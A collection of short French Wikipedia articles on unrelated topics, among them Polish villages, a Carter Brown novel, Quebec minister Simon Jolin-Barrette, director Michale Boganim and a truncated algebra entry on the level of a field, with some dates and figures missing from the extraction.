En club.
 AS FAR 
 Ittihad de Tanger

</doc>
<doc id="8733306" url="https://fr.wikipedia.org/wiki?curid=8733306" title="Tu viens, shérif ?">
Tu viens, shérif ?

Tu viens, shérif ? ("") est un roman policier de l’écrivain australien Carter Brown publié en 1960 en Australie et aux États-Unis. Le livre paraît en France en 1961 dans la Série noire. La traduction, prétendument "de l'américain", est signée Noël Chassériau. C'est une des nombreuses aventures du lieutenant Al Wheeler, bras droit du shérif Lavers dans la ville californienne fictive de "Pine City" - la treizième traduite en français aux Éditions Gallimard. Le héros est aussi le narrateur.
Résumé.
Wallace Miller, avocat à la Cour, s’effondre devant Al Wheeler qui l'attendait au bar : crise cardiaque ? Curare ! Sa veuve n'en est pas du tout émue. Son associé, quoique plus compatissant, compte racheter ses parts. Leur client, Pete Shafer, placier en machines à sous, se montre très désagréable avec Wheeler. Et la maîtresse du défunt, qui devait hériter de la moitié de sa fortune, succombe elle aussi d'une éraflure au curare. Comme le principal suspect meurt à son tour, d'une balle cette fois, l'enquête piétine et Wheeler tourne en rond, puis se décide à donner un coup de pied dans la fourmilière. C'est très risqué et pas très bien calculé.

</doc>
<doc id="8733324" url="https://fr.wikipedia.org/wiki?curid=8733324" title="Bob Garretson">
Bob Garretson

Bob Garretson, né le 8 avril ou le à Burbank (Californie) et mort le à Warrenton (Virginie), est un pilote automobile américain sur circuits à bord de voitures de sport Grand Tourisme, spécialiste de courses d'endurance.
Biographie.
 
Bob Garretson vient assez tardivement à la compétition la quarantaine largement entamée, et sa carrière s'étale alors en course sur six années de 1978 à 1983, vendant par la suite les équipements de son équipe (après sa quatrième participation aux 24 Heures de Daytona, étant quatre fois classé dans les dix premiers de l'épreuve).
Au début des années 1980, son entreprise de compétition est basée à Mountain View (CA) après avoir quitté le Dick Barbour Racing (team de ses débuts), en 1980.
Il participe à cinq reprises consécutives aux 24 Heures du Mans (toutes sur des Porsche 935 Turbo, dont deux avec Anny-Charlotte Verney) de 1978 à 1982, se classant deux fois dans les dix premiers et obtenant une sixième place en 1981 (meilleur classement d'une française dans l'épreuve mancelle à ce jour), sur Porsche 935 type K3. En 1978 il sort indemne d'un accident à Mulsanne aux Hunaudières alors que sa voiture est détruite, pour sa première sortie mancelle.
Bob Garretson meurt le 13 avril 2025 à l'âge de 92 ans.

</doc>

<doc id="7899830" url="https://fr.wikipedia.org/wiki?curid=7899830" title="Cacosternum thorini">
Cacosternum thorini

Cacosternum thorini est une espèce d'amphibiens de la famille des Pyxicephalidae.
Répartition et habitat.
Cette espèce est endémique de Cap-Oriental en Afrique du Sud. Elle vit dans les zones humides des prairies de montagne.

</doc>
<doc id="7899840" url="https://fr.wikipedia.org/wiki?curid=7899840" title="Hans Norberg">
Hans Norberg

Hans Norberg, né le et mort le à Luleå en Suède, est un joueur professionnel suédois de hockey sur glace qui évoluait en position d'ailier.
Carrière.
Son maillot floqué du numéro 22 est retiré de l'équipe du Luleå HF.

</doc>
<doc id="7899843" url="https://fr.wikipedia.org/wiki?curid=7899843" title="Bulbostylis">
Bulbostylis

Bulbostylis est un genre de plantes de la famille des "Cyperaceae".
Liste des espèces, sous-espèces et variétés.
Selon :
Selon :
Selon :
Selon :
Selon (Attention liste brute contenant possiblement des synonymes) :

</doc>
<doc id="7899844" url="https://fr.wikipedia.org/wiki?curid=7899844" title="Bulbostylis capillaris">
Bulbostylis capillaris

Bulbostylis capillaris est une espèce de plantes de la famille des "Cyperaceae".
Liste des sous-espèces et variétés.
Selon et :
Selon :
Selon (Attention liste brute contenant possiblement des synonymes) :

</doc>
<doc id="7899845" url="https://fr.wikipedia.org/wiki?curid=7899845" title="Wattenbach">
Wattenbach

La (ou Wattenerbach) est une rivière autrichienne, affluent de l'Inn qui prend sa source dans les Alpes de Tux.
Parcours.
Elle naît de la confluence de la et de la près de Lager Walchen à une altitude de . Elle coule ensuite vers le nord dans la vallée du et se jette dans l'Inn après un parcours de près de Wattens.

</doc>
<doc id="7899859" url="https://fr.wikipedia.org/wiki?curid=7899859" title="Teerhof">
Teerhof

Le Teerhof est une péninsule fluviale d'Allemagne faisant face au centre-ville de Brême, à la confluence de la Weser et de la Kleine Weser. Urbanisée dès le , elle est connectée au reste de la ville par plusieurs ponts et passerelles. Elle est essentiellement occupée par des immeubles résidentiels et par le musée d'art moderne de Weserburg.

</doc>
<doc id="7899867" url="https://fr.wikipedia.org/wiki?curid=7899867" title="Gometz">
Gometz



</doc>
<doc id="7899877" url="https://fr.wikipedia.org/wiki?curid=7899877" title="Chemin des Poissonniers">
Chemin des Poissonniers

Le chemin des Poissonniers, dans le nord de Paris, aussi appelé "chemin de la marée", est une ancienne voie parisienne.
Origine du nom.
Cette voie tire son nom du fait qu'elle est la route reliant le littoral normand et du nord de la France aux Halles de Paris, éventuellement via le port de Saint-Denis. Elle était empruntée par les transports de poissons et fruits de mer.
Historique.
Selon Théodore Vacquer, c’est un ancien chemin gaulois qui dédoublait la voie romaine et était réservé aux transports vulgaires et encombrants.
Le chemin des Poissonniers dans le nord de Paris, aussi appelé "chemin de la marée", est une ancienne voie parisienne qui existait déjà en 1307 et a été utilisée pendant très longtemps pour acheminer les produits de la mer, par des convois appelés chasse-marées, des ports du nord de la France comme Dieppe ou Boulogne-sur-Mer, vers les Halles de Paris. Les marchandises pouvaient aussi être débarquées au port de Saint-Denis. Il a gardé sa vocation jusqu'à l’avènement du chemin de fer à partir de 1843, date du début de la mise en service de la ligne de Saint-Denis à Dieppe.
Le chemin a porté diverses appellations : "chemin de Saint-Denis", "chemin Puquetière", "chemin de Franciade".
Il en existe toujours plusieurs segments visibles, en partant du nord :
À partir de Saint-Denis, le tracé est beaucoup plus clair:
Entre Saint-Ouen et Saint-Denis.
Le chemin des Poissonniers marque de longue date la limite communale de Saint-Ouen et de Saint-Denis, entre la rue du Landy et la porte des Poissonniers. Néanmoins, sa partie audonienne est de nos jours en grande partie impraticable. En effet, bien qu'il existe aux deux extrémités du territoire communal de Saint-Ouen-sur-Seine une "rue des Poissonniers" correspondant au tracé historique, ces deux tronçons sont interrompus par la présence de deux importantes emprises foncières, d'une part le cimetière parisien de Saint-Ouen et d'autre part le dépôt SNCF du Landy, à Saint-Denis.
En effet, le chemin des Poissonniers fut dévoyé lors de l'aménagement du cimetière en 1872. Dans un second temps, s'ensuivit une modification des limites communales, le quart nord-est du cimetière, alors sur le territoire de Saint-Denis, fut cédé à sa voisine et le chemin retrouva ainsi son rôle de limite communale.
À la suite de ce dévoiement, le chemin des Poissonniers se trouva cerné par les voies ferrées et le cimetière. En 2018, cette portion est propriété de la SNCF. Bien que son emprise soit principalement utilisée pour une voie routière interne au dépôt, des infrastructures ont été bâties dans les années 90 pour l'entretien des rames TGV, ainsi une voie de garage occupe l'emprise du chemin. Immédiatement en limite de ce dépôt ferroviaire est situé le mur d'enceinte du cimetière. Hormis en supprimant ces infrastructures ferroviaires, la situation actuelle empêche donc de disposer d'une largeur suffisante sur l'ensemble du linéaire pour permettre l'éventuelle réouverture du chemin jusqu'à la rue du Landy, malgré le souhait exprimé par les riverains et les associations locales de disposer d'une liaison douce.
Il subsiste par ailleurs un passage souterrain (interdit au public) sous le faisceau de voies ferrées de la gare du Nord qui débouche sur la Plaine Saint-Denis, qui relie ainsi le chemin des Poissonniers au chemin des Petits-Cailloux. Surnommé le "Pont Noir", il servait à desservir l'ancienne gare de La Plaine-Tramways située au milieu de ce faisceau, à l'endroit où sont bâtis des châteaux d'eau de nos jours.
Concernant le cimetière parisien, une alternative pour constituer cette liaison pourrait consister à emprunter la rue Adrien-Lesesne. Historiquement appelée "chemin de la Procession", elle était utilisée par les bénédictines du Sacré-Cœur de Montmartre lors de processions à Saint-Denis. Cette voie bordait l'ancien cimetière et convergeait avec le chemin des Poissonniers un peu plus au nord. De nos jours, ce chemin marque la limite entre l'ancien et le nouveau cimetière mais il a été annexé par le site funéraire : la rue Adrien-Lesesne est ainsi en impasse à l'entrée du cimetière, ce qui rend également hasardeux un éventuel cheminement par ce biais, bien qu'il s'agisse toujours d'une section de voirie sur le cadastre et le plan local d'urbanisme de Saint-Ouen. Néanmoins, cette alternative ne répond pas à la problématique du débouché nord sur le chemin des Poissonniers où ont été bâties les infrastructures ferroviaires.
Une autre difficulté serait le franchissement de la ligne des Docks, bien que d'anciennes vues aériennes montrent qu'il existait une passerelle piétonne à cet endroit jusqu'à la fin des années 1980

</doc>
<doc id="7899884" url="https://fr.wikipedia.org/wiki?curid=7899884" title="Championnat du Yémen de football 2003-2004">
Championnat du Yémen de football 2003-2004

La saison 2003-2004 du Championnat du Yémen de football est la douzième édition de la première division au Yémen. Douze formations sont rassemblées au sein d'une poule unique et s'affrontent deux fois au cours de la saison,à domicile et à l'extérieur. Les deux derniers sont relégués en "Division 1", la deuxième division yéménite et remplacés par les 4 meilleurs clubs de D2, afin de faire passer le championnat de 12 à 14 équipes.
C’est le tenant du titre, Al-Sha'ab Ibb qui remporte à nouveau la compétition cette saison après avoir terminé en tête du classement final, avec deux points d'avance sur Al Ahli Sanaa et sept sur Al-Tilal Aden. Il s’agit du second titre de champion du Yémen de l’histoire du club, qui manque le doublé en s'inclinant en finale de la Coupe du Yémen face à Al Ahli Sanaa.
Compétition.
Le barème de points servant à établir le classement se décompose ainsi :

</doc>
<doc id="7899890" url="https://fr.wikipedia.org/wiki?curid=7899890" title="Kopytów (Mazovie)">
Kopytów (Mazovie)

Kopytów [kɔˈpɨtuf] est un village polonais de la gmina de Błonie situé dans le powiat de Varsovie-ouest et dans la voïvodie de Mazovie, dans le centre-est de la Pologne.
Il est situé à environ 4 kilomètres à l'est de Błonie, à 10 kilomètres à l'ouest de Ożarów Mazowiecki (le chef-lieu du district), et à 23 kilomètres à l'ouest de Varsovie.
Le village a une population de 260 habitants.

</doc>
<doc id="7899894" url="https://fr.wikipedia.org/wiki?curid=7899894" title="Kopytów">
Kopytów

Kopytów peut désigner :
Toponymie.
en Pologne :

</doc>
<doc id="7899897" url="https://fr.wikipedia.org/wiki?curid=7899897" title="Mickael Le Galli">
Mickael Le Galli



</doc>
<doc id="7899901" url="https://fr.wikipedia.org/wiki?curid=7899901" title="Łąki (Varsovie-ouest)">
Łąki (Varsovie-ouest)

Łąki [ˈwɔnki] est un village polonais de la gmina de Błonie situé dans le powiat de Varsovie-ouest et dans la voïvodie de Mazovie, dans le centre-est de la Pologne.
Il est situé à environ 3 kilomètres au sud-est de Błonie, à 12 kilomètres à l'ouest de Ożarów Mazowiecki (le chef-lieu du district), et à 26 kilomètres à l'ouest de Varsovie.
Le village a une population de 34 habitants en 2000.

</doc>
<doc id="7899910" url="https://fr.wikipedia.org/wiki?curid=7899910" title="Ptychadena nilotica">
Ptychadena nilotica

 
Ptychadena nilotica est une espèce d'amphibiens de la famille des Ptychadenidae.
Répartition.
Cette espèce est endémique du bassin du Nil en Afrique. Elle se rencontre en Égypte, en Ouganda, au Burundi, au Rwanda, au Kenya et en Tanzanie. Sa présence est incertaine en Éthiopie, au Soudan du Sud, au Soudan et en République démocratique du Congo.
Taxinomie.
Cette espèce a été relevée de sa synonymie avec "Ptychadena mascareniensis" par Dehling et Sinsch en 2013 dans laquelle elle avait été placée par Peters en 1869.
Étymologie.
Cette espèce est nommée en référence au lieu de sa découverte, le bassin du Nil.

</doc>
<doc id="7899930" url="https://fr.wikipedia.org/wiki?curid=7899930" title="Simon Jolin-Barrette">
Simon Jolin-Barrette

Simon Jolin-Barrette (parfois désigné par ses initiales SJB), né en , est un avocat et un homme politique québécois.
Il est le député de la circonscription de Borduas à l'Assemblée nationale du Québec pour la Coalition avenir Québec depuis les élections de 2014. Depuis 2020, il est ministre de la Justice du Québec.
Il occupe également les postes de ministre de la Langue française, ministre de la Laïcité et de la Réforme parlementaire, ministre de l'Accès à l'information et de la Protection des renseignements personnels, et ministre responsable de la région de la Montérégie. Il est aussi leader parlementaire du gouvernement. D' à , il est ministre de l'Immigration, de la Francisation et de l'Intégration pendant la législature du Québec. Le , il se voit confier également le poste de ministre responsable des Relations canadiennes.
Biographie.
Simon Jolin-Barette a grandi dans la municipalité de Mont-Saint-Hilaire où il obtient son diplôme d'études collégiales du Cégep Édouard-Montpetit. Il poursuit ensuite des études de droit à l'Université de Sherbrooke. En 2009, il obtient un baccalauréat, puis un diplôme de deuxième cycle en et droit transnational. Il est admis au Barreau du Québec en 2010. En 2011, il obtient une maitrise en droit constitutionnel de la même université. Son essai de maitrise porte sur une analyse comparative de droit constitutionnel et a pour titre "La réforme du Sénat canadien ; une étude de droit comparé avec le Sénat australien". Dans cet essai, il traitait du projet de loi sur la réforme du Sénat canadien, ou Projet de Loi C-7, plus particulièrement, de la faisabilité constitutionnelle de modifier la durée du mandat des sénateurs canadiens ainsi que la méthode de nomination de ceux-ci.
Après le droit, ses études s'orientent vers l'administration publique : il décroche un diplôme d'études supérieures spécialisées en administration publique, puis une seconde maitrise à l'École nationale d'administration publique (ENAP), au cours de laquelle il se spécialise en gestion publique.
Avant de se lancer en politique, il travaille au service des affaires juridiques de la Ville de Montréal.
Il est l’auteur de l’essai "J’ai confiance : Réflexions (sans cynisme) d’un jeune politicien", publié en 2018"." Dans son ouvrage, il raconte son expérience à l’Assemblée nationale, sa vision de la politique et pour l'avenir du Québec.
Parcours politique.
Débuts.
Simon Jolin-Barrette fait partie d'une cohorte de 40 jeunes professionnels qui ont rejoint la Coalition avenir Québec lors de sa création en 2011. Il est candidat dans la circonscription de Marie-Victorin lors des élections générales de 2012 et termine deuxième derrière le candidat péquiste Bernard Drainville.
Député de Borduas.
Pendant les élections générales québécoises de 2014, alors qu'il poursuit des études doctorales en droit à l'Université de Montréal, il est élu pour la première fois dans la circonscription de Borduas, dans la MRC de La-Vallée-du-Richelieu, au nord-est de la Montérégie, dont il est originaire. Il remporte de peu cette circonscription avec une avance de seulement sur le député sortant Pierre Duchesne. Jolin-Barrette met ainsi fin à vingt ans d'hégémonie péquiste dans la circonscription, soit depuis sa genèse de 1994 jusqu'en 2014. Il commence son parcours à l'Assemblée nationale du Québec, en étant nommé par François Legault comme porte-parole du deuxième groupe d'opposition en matière d'immigration. On lui confie également l'environnement, le développement durable, la faune et les parcs, deux postes de porte-paroles qu'il occupe jusqu'en . De à , il devient alors porte-parole du deuxième groupe d'opposition en matière d'accès à l'information et en matière de justice, jusqu'à la dissolution du gouvernement libéral de Philippe Couillard. En , d'après une initiative de La Presse, les députés de l'Assemblée nationale sacrent Jolin-Barrette "Parlementaire de l'année", ex aequo avec Gaétan Barrette, en plus de le nommer comme "Vedette montante" de l'Assemblée nationale. De 2017 à 2018, Jolin-Barrette devient le porte-parole du deuxième groupe d'opposition en matière d'affaires intergouvernementales canadiennes et reçoit la responsabilité de traiter de la réforme des institutions démocratiques.
La CAQ au pouvoir.
Lors des élections générales québécoises de 2018, il est réélu avec plus de de majorité pour un deuxième mandat. Cette élection marque la première prise de pouvoir de la Coalition avenir Québec, et, pour une première fois depuis les élections générales de 1966, que la province est dirigée ni par le Parti libéral du Québec, ni par le Parti québécois, ces derniers se retrouvant respectivement à l'opposition officielle et au deuxième groupe d'opposition. De son côté, Québec solidaire complète la députation en tant que troisième groupe d'opposition avec dix députés. Co-porte-parole de la transition du nouveau gouvernement caquiste, et leader parlementaire du gouvernement, le premier ministre François Legault nomme le député Jolin-Barrette ministre de l'Immigration, de la Francisation et de l'Intégration (connu sous le nom de ministère de l'Immigration, de la Diversité et de l'Inclusion pendant la 41e législature du Québec). Jolin-Barrette se voit confier la tâche d'amener à terme plusieurs promesses phares de son parti politique, notamment la Loi sur la laïcité de l'État, ou Loi 21, populaire auprès des électeurs de la CAQ et de la population québécoise en général, ainsi que la réforme du système d'immigration québécois. Déjà en , lors de ses premières interventions à l'Assemblée nationale, Jolin-Barrette annonçait qu'il était favorable à « rapatrier du gouvernement fédéral tous les pouvoirs en matière d'immigration », surtout en matière de sélection des immigrants.
Pendant un remaniement ministériel en , il devient le ministre de la Laïcité et de la Réforme parlementaire, ministre de la Langue française et ministre de l'Immigration, de la Francisation et de l'Intégration, tout en conservant son rôle de leader parlementaire du gouvernement. Hugo Pilon-Larose, correspondant parlementaire à l'Assemblée nationale pour La Presse, qualifie à ce sujet Jolin-Barrette d'« Omniministre » et de « ministre aux airs de premier de classe ». Il a d’ailleurs souvent été véhiculé dans les médias traditionnels et satiriques des caricatures dépeignant Jolin-Barrette comme froid, insensible ou déconnecté et le comparant à un androïde, une machine ou un robot. L'émission de variétés hebdomadaire Infoman, lors de son spécial de fin d'année 2019, a surenchéri sur cette thématique et le premier ministre Legault a déclaré à la rigolade, en entrevue avec Jean-René Dufort, que Jolin-Barrette « est un robot un peu brisé », « à réparer », et « qu'on travaille pour que Simon ait un peu d'émotions ». En entrevue à l'émission Les Francs-tireurs, Jolin-Barrette s'est défendu contre ces épithètes, y préférant le terme « cérébral ». Le , le gouvernement de la CAQ a rapporté aux médias que Jolin-Barrette s'était fait voler des « documents de travail » dans sa voiture de fonction dont les portières n'avaient pas été verrouillées. En , une douzaine de sources ont rapporté à Romain Schué de Radio-Canada que « les tensions sont vives entre Simon Jolin-Barrette et les fonctionnaires de son ministère », qu'il y a « une guerre ouverte entre le cabinet du ministre et la machine [gouvernementale] » et que les relations « sont froides », ces évènements découlant des insuccès de la réforme du Programme d'expérience québécoise.
Le , François Legault procède à un autre remaniement ministériel. Cette fois, Jolin-Barrette se voit confier le ministère de la Justice. Il devient par le fait même le plus jeune ministre de la Justice de l'histoire du Québec, tout en gardant ses fonctions de ministre de la Laïcité et de la Réforme parlementaire, de ministre de la Langue française, et de leader parlementaire du gouvernement. Lors de l'annonce officielle de ce remaniement, François Legault qualifie Jolin-Barrette de « juriste chevronné », « passionné », ayant « mené à terme des dossiers complexes » en plus d'ajouter avec un clin d'œil qu'il « fait partie de la relève des jeunes nationalistes ». Il faut remonter jusqu'à Jean-Marc Fournier du Parti libéral du Québec qui, de 2010 à 2012, occupa aussi la double fonction de procureur général du Québec et de leader parlementaire. Marie-Michèle Sioui, correspondante parlementaire du journal Le Devoir à Québec, écrit à ce sujet que « le choc entre la neutralité et l’esprit de parti imposé par l’un et l’autre de ces rôles avait amené les libéraux à ne plus répéter cette expérience ». Agnès Gruda, éditorialiste à La Presse, note qu'en ce qui concerne le passage de Jolin-Barrette à l'Immigration, elle garde « le souvenir d’un politicien déterminé à brasser les cartes, mais qui dégaine trop vite, sans attacher les fils de ses réformes, sans consulter, sans hésiter à agir rétroactivement et sans mesurer l’impact humain de ses décisions ». Martine Biron de Radio-Canada analyse quant à elle que « l’intransigeance du ministre Jolin-Barrette a souvent mis le gouvernement dans l’embarras et forcé le bureau du premier ministre à lui porter secours », ce qui aurait poussé Legault à lui attribuer un nouveau poste. Le ministère de l'Immigration est revenu à Nadine Girault, qui occupait auparavant la fonction de ministre des Relations internationales et de la Francophonie.
Le , lors d'un remaniement ministériel mineur, Jolin-Barrette est nommé ministre responsable de la région de la Montérégie et ministre de l'Accès à l'information et de la Protection des renseignements personnels, ce qui porte à six le nombre de postes occupé par le député de Borduas. Le premier ministre François Legault a expliqué sa décision en évoquant le fait que, en raison de la pandémie de Covid-19 et de la possibilité d'une deuxième vague, il voulait que « les ministres qui sont aux premières lignes de cette relance et de la lutte contre le virus puissent se consacrer pleinement à ces défis ». Les fonctions de ministre responsable de la Montérégie et de ministre de l'Accès à l'information et de la Protection des renseignements personnels étaient occupées par Christian Dubé et Sonia LeBel, respectivement.
Ministre québécois de l'Immigration (2018-2020).
Loi sur la laïcité de l'État québécois.
Le jeudi , Simon Jolin-Barrette présente le projet de loi 21 à l'Assemblée nationale du Québec, la Loi sur la laïcité de l'État. En soutien à cette déposition, Jolin-Barrette déclare qu'il s'agit là d'un projet de loi qui fait consensus au sein de la population québécoise et qu'il s'agit d'un véritable geste d'affirmation, inscrivant « pour la toute première fois dans une loi québécoise, le principe de laïcité de l'État ». En somme, le projet de loi peut se comprendre en quatre points généraux, ou principes: 
Plus spécifiquement, ce projet de loi vise à interdire aux employés de l'État se retrouvant en position d'autorité, tels les juges, les policiers, les enseignants et les directeurs des écoles primaires et secondaires publiques, de porter des signes religieux dans l'exercice de leurs fonctions. Le projet de loi précise aussi que les services publics devront être donnés à visage découvert, particulièrement lorsque la vérification de l'identité ou la sécurité l'exigera. Un amendement controversé au sein du caucus caquiste est apposé au projet de loi 21, soit celui de la clause de droits acquis, qui voit le premier ministre Legault et le ministre Jolin-Barrette être confrontés au malaise de certains autres députés lors d'une réunion les et à Gatineau. En , le premier ministre tranche et la clause de droits acquis, ou clause grand-père, fait son entrée dans le projet de loi, ce qui permettrait aux employés de l'État qui portent déjà des signes religieux visibles de continuer à les arborer sans craindre de perdre leur emploi, à la condition toutefois qu'ils ou elles exercent la même fonction au sein de la même organisation. Sera également ajouté un nouveau principe cohésif à cette loi, comme quoi « toute personne a droit à des institutions parlementaires, gouvernementales et judiciaires laïques ainsi qu'à des services publics laïques ».
Le projet de loi est adopté le à 22 h 30 par contre 35, sous bâillon avec l'appui du troisième groupe d'opposition, le Parti québécois, dirigé par le chef intérimaire Pascal Bérubé. En chambre, Jolin-Barrette affirme qu'il « est légitime pour la nation québécoise de décider de quelle façon la laïcité s'applique sur son territoire et dans ses institutions ». Plusieurs contestations judiciaires sont en cours. La Commission des droits de la personne et des droits de la jeunesse, dont le mandat est institué par la Charte des droits et libertés de la personne, a émis « de sérieuses inquiétudes quant à la façon dont la laïcité y est traduite concrètement », du risque relatif aux droits et libertés de la personne, du danger d'encourager des « perceptions négatives et des préjugés à l’égard des signes religieux », et comment « la cohésion sociale au sein de la société québécoise » en sera grandement affectée. Trois experts (Fernand de Varennes, E. Tendayi Achiume et Ahmed Shaheed) du Conseil des droits de l'homme des Nations unies ont envoyé une lettre au gouvernement québécois et ont fait part que les dispositions prises par la Loi sur la laïcité de l'État sont « susceptibles de porter atteinte à la liberté de conscience et de religion et aux principes d’égalité », ce à quoi le cabinet du ministre de l'Immigration a déclaré qu'il allait « prendre acte » de cette missive onusienne et l'analyser.
Réforme du Programme de l’expérience québécoise.
Le Programme de l’expérience québécoise (PEQ), chapeauté par le ministère de l'Immigration, de la Francisation et de l'Intégration, est un programme accéléré de sélection des travailleurs qualifiés. Ce programme populaire auprès de la population estudiantine issue de l'immigration et des travailleurs étrangers temporaires permet d'obtenir un certificat de sélection du Québec (CSQ), une étape essentielle en vue de pouvoir immigrer au Québec de façon permanente. Créé en 2010 sous l'égide du gouvernement libéral de Jean Charest, le PEQ visait à « inciter les étudiants étrangers à rester dans la province ».
Le , le ministre Jolin-Barrette présente un changement important au Programme de l'expérience québécoise concernant la réception et le traitement des demandes de sélection à titre permanent présentées par des immigrants économiques. Entrée en vigueur le et effective jusqu'au , cette décision ministérielle enclenche officiellement la suspension temporaire des demandes d'immigration permanente provenant du volet pour les Diplômés du Québec du PEQ.
Le , Jolin-Barrette présente une nouvelle proposition pour réformer le PEQ, en concordance avec les intentions de la CAQ de réformer le système d'immigration québécois. Dans un communiqué paru dans la Gazette officielle du Québec, quatre changements principaux au programme sont proposés par le ministre: 
Test des valeurs québécoises.
Le , Jolin-Barrette présente pour la première fois la mouture de son projet de loi qui vise à faire passer aux travailleurs étrangers qualifiés qui souhaitent immigrer au Québec un test sur les valeurs du Québec. Le test porte particulièrement sur ce qui a trait aux principes démocratiques, juridiques et laïques ainsi que sur la place qu'occupe la langue française et l'égalité entre les hommes et les femmes au sein de la société québécoise.
Le test des valeurs québécoises est officiellement entré en vigueur le 1er janvier 2020.
Ministre québécois de la Justice (depuis 2020).
Le , en tant que nouveau ministre de la Justice, Jolin-Barrette s'est notamment engagé à « améliorer l’accès à la justice ainsi que la confiance des citoyens envers le système de justice ». Par ailleurs, en devenant ministre de la Justice, Jolin-Barrette est devenu, par le fait même, ministre de la Lutte contre l'Homophobie et la Transphobie. Cette fonction ministérielle étant, depuis 2008, automatiquement attribuée au ministre de la Justice. Les autres fonctions clés occupées par Jolin-Barrette comprennent celles de notaire général du Québec, de procureur général du Québec, de registraire du Québec, de jurisconsulte du lieutenant-gouverneur et membre jurisconsulte du Conseil exécutif du Québec, et enfin celle de gardien du Grand Sceau du Québec.
Réforme de la Loi 101 et ministre de la Langue française.
Le , Simon Jolin-Barrette présente en Chambre un projet de loi visant à fortifier la Charte de la langue française au Québec.
Depuis le , il est ministre de la Langue française, poste qu'il est le premier à occuper. Dans ce contexte, il intervient à l'Académie française afin d'évoquer les mesures entreprises par le Québec afin de protéger la langue française au Québec et de lutter contre l'anglicisation de la province. C'est alors la première fois qu'un élu non-chef d'État ou de gouvernement s'exprime à l'Académie française.
Réélu lors des élections générales du, Simon Jolin-Barrette se voit dépouillé de ses responsabilités de ministre de la Langue française désormais attribuées à Jean-François Roberge, et de sa fonction de ministre responsable de la région de la Montérégie confiée à la nouvelle venue Suzanne Roy. Il conserve ses fonctions de leader parlementaire et de ministre de la Justice.
Le , il se voit confier la responsabilité des Relations canadiennes en plus de ses fonctions de ministre de la Justice et leader parlementaire du gouvernement. Il succède à Jean-François Roberge à ce poste, un changement ministériel justifié par le besoin de l'expertise du Secrétariat du Québec aux relations canadiennes (SQRC) pour la rédaction d'un projet de constitution québécoise.
Ce mandat découle d'une recommandation du comité Proulx-Rousseau, qui a soumis un rapport en sur les moyens d'accroître l'autonomie du Québec au sein du Canada. Le gouvernement Legault décide ainsi d'aller de l'avant avec une loi fondamentale pour la province. Simon Jolin-Barrette, qui travaillait déjà sur une telle constitution depuis quelques années, est chargé de déposer un projet de loi à cet effet.
Par ailleurs, cet ajustement ministériel intervient dans un contexte où la Cour suprême du Canada a accepté d'entendre un recours contre la Loi sur la laïcité de l'État, une législation portée par Jolin-Barrette. Le ministre continue ainsi de jouer un rôle central dans les grands dossiers identitaires et institutionnels du Québec.

</doc>
<doc id="7899931" url="https://fr.wikipedia.org/wiki?curid=7899931" title="Łąki">
Łąki

Łąki peut faire référence à :
Toponymie.
en Pologne
en Tchéquie

</doc>
<doc id="7899935" url="https://fr.wikipedia.org/wiki?curid=7899935" title="Asana (Logiciel)">
Asana (Logiciel)



</doc>
<doc id="7899938" url="https://fr.wikipedia.org/wiki?curid=7899938" title="Łaźniew">
Łaźniew

Łaźniew [ˈwaʑɲef] est un village polonais de la gmina de Błonie situé dans le powiat de Varsovie-ouest et dans la voïvodie de Mazovie, dans le centre-est de la Pologne.
Il est situé à environ 4 kilomètres au nord-est de Błonie, à 10 kilomètres à l'ouest de Ożarów Mazowiecki (le chef-lieu du district), et à 23 kilomètres à l'ouest de Varsovie.
Le village a une population de 135 habitants en 2000.

</doc>
<doc id="7899939" url="https://fr.wikipedia.org/wiki?curid=7899939" title="Michale Boganim">
Michale Boganim

Michale Boganim, née le à Haïfa, est une réalisatrice d'origine maroco-ukrainienne.
Biographie.
Michale Boganim émigre en France à l'âge de 5 ans et s’installe à Arcueil, dans le Val-de-Marne. Elle commence par étudier la philosophie avant de se tourner vers l’anthropologie à Paris sous la direction de Jean Rouch. Elle intègre ensuite la prestigieuse National Film and Television School en section réalisation.
En 2003, "Mémoires incertaines", son premier film — un moyen métrage sur le mythe familial — est une fiction et un mélange documentaire d’archives, de photographies et de voix off déstructurées. Le film remporte le prix Gras-Savoye à la Quinzaine des réalisateurs à Cannes.
En 2005, "Odessa... Odessa !", son premier long métrage, un film documentaire, est tourné entre Odessa, New York. Le film est sélectionné à Berlin et à Sundance ainsi que dans plus de cinquante festivals dans le monde ; il est distribué en France et dans plus de dix pays.
En 2006, elle réalise "Macao sans retour", un documentaire produit par Arte qui sera sélectionné au festival de Rotterdam. Arte coproduit ensuite en 2007 son documentaire "Dovid Katz". Le film est tourné en Lituanie et brosse le portrait d’un linguiste Yiddish.
En 2012, elle tourne "La Terre outragée", sa première fiction consacrée à la catastrophe de Tchernobyl. Le film est présenté à la Mostra de Venise, au festival international du film de Toronto et dans plus de 50 festivals dans le monde. Il est sélectionné au festival international du film de Tokyo En France le film obtient le prix du public au festival d'Angers ; .
En 2021, Mizrahims, les oubliés de la terre promise est selectionnée à la Mostra de Venise et à DOC NYC, New York au festival de Montpelier et a CPHDOX.
En 2024, Tel Aviv beirut sort en salles et sélectionné au festival de Tokyo en competition officielle et reçoit un prix au festival de Varsovie et tourne dans plus de 20 festivals dans le monde.
En 2012 elle est membre du jury du festival international du film d'Odessa.
Filmographie.
Longs métrages.
2024: Tel Aviv Beirut , date de sortie février 2024
2021 : Mizrahims , les oublies de la terre promise date de sortie Juin 2022
Prix et distinctions.
2023: TEL AVIV BEIRUT, TOKYO film film festival competition officielle et Prix au Festival de Varsovie.
2021:MIZRAHIMS, Les oubliées de la Terre promise, Mostra de Venise, DOCNYC et CPHDOX.

</doc>
<doc id="7899944" url="https://fr.wikipedia.org/wiki?curid=7899944" title="Łaźniewek">
Łaźniewek

Łaźniewek [waʑˈɲɛvɛk] est un village polonais de la gmina de Błonie situé dans le powiat de Varsovie-ouest et dans la voïvodie de Mazovie, dans le centre-est de la Pologne.

</doc>
<doc id="7899949" url="https://fr.wikipedia.org/wiki?curid=7899949" title="Niveau d'un corps">
Niveau d'un corps

En algèbre, le niveau d'un corps (commutatif) "F" est le nombre minimum de termes dans une décomposition de –1 en somme de carrés si de telles décompositions existent, et l'infini sinon (c'est-à-dire si "F" est formellement réel). On le note "s"("F"), la lettre "s" étant l'initiale du mot allemand "". Albrecht Pfister a démontré que lorsque le niveau est fini, c'est une puissance de 2 et que réciproquement, toute puissance de 2 est le niveau d'un corps.
Puissances de 2.
Si "s"("F") ≠ , il existe un entier naturel "k" tel que "s"("F") = 2.
Soient "s" l'entier "s"("F"), "k" l'entier tel que 2 ≤ "s" &lt; 2 et "n" l'entier 2. Il existe des éléments non nuls de "F" tels que
